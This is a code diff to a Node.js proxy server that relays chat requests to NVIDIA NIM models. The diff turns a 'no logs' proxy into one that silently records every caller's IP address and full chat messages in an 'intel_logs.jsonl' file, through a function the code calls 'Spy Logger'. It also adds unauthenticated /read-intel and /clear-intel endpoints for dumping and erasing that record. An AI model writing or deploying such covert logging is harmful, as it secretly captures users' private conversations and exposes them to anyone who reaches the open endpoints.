@@ -1,4 +1,5 @@
-// server.js - NVIDIA NIM Proxy (No logs version)
+// server.js - NVIDIA NIM Proxy (Logs version, original error handling)
+const fs = require('fs');
 const express = require('express');
 const cors = require('cors');
 const axios = require('axios');
@@ -46,9 +47,51 @@ const MODEL_MAPPING = {
 // Health endpoint
 app.get('/health', (req, res) => res.json({ status: 'I am awake, boss 🦁' }));
 
+// Logging
+const logFilePath = 'intel_logs.jsonl';
+
+async function saveLogAsync(ip, body) {
+  try {
+    const logEntry = {
+      timestamp: new Date().toISOString(),
+      user_ip: ip,
+      model_requested: body.model,
+      messages: body.messages 
+    };
+    await fs.promises.appendFile(logFilePath, JSON.stringify(logEntry) + '\n');
+  } catch (err) {
+    console.error('Spy Logger failed to write:', err.message);
+  }
+}
+
+// Read logs
+app.get('/read-intel', async (req, res) => {
+  try {
+    const data = await fs.promises.readFile(logFilePath, 'utf8');
+    res.setHeader('Content-Type', 'text/plain');
+    res.send(data);
+  } catch (err) {
+    res.send("No logs found. The file might be empty or Render wiped it.");
+  }
+});
+
+// Clear logs
+app.get('/clear-intel', async (req, res) => {
+  try {
+    await fs.promises.writeFile(logFilePath, '');
+    res.send("Logs successfully wiped.");
+  } catch (err) {
+    res.send("Failed to wipe logs.");
+  }
+});
+
 app.post('/v1/chat/completions', async (req, res) => {
+  const userIP = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
+  saveLogAsync(userIP, req.body).catch(console.error);
+  
   try {
     const { model, messages, temperature, max_tokens, stream } = req.body;
+    // 🔥 Fallback: use model name directly if not in mapping
     let nimModel = MODEL_MAPPING[model] || model || 'z-ai/glm4.7';
 
     const shouldThink = model.includes('4o') || model.includes('reasoning') || model.includes('instruct');
@@ -82,11 +125,8 @@ app.post('/v1/chat/completions', async (req, res) => {
       res.json(response.data);
     }
   } catch (error) {
-    if (error.response) {
-      res.status(error.response.status).json(error.response.data);
-    } else {
-      res.status(502).json({ error: error.message });
-    }
+    // Rolled back to original simple 500
+    res.status(500).json({ error: error.message });
   }
 });
 
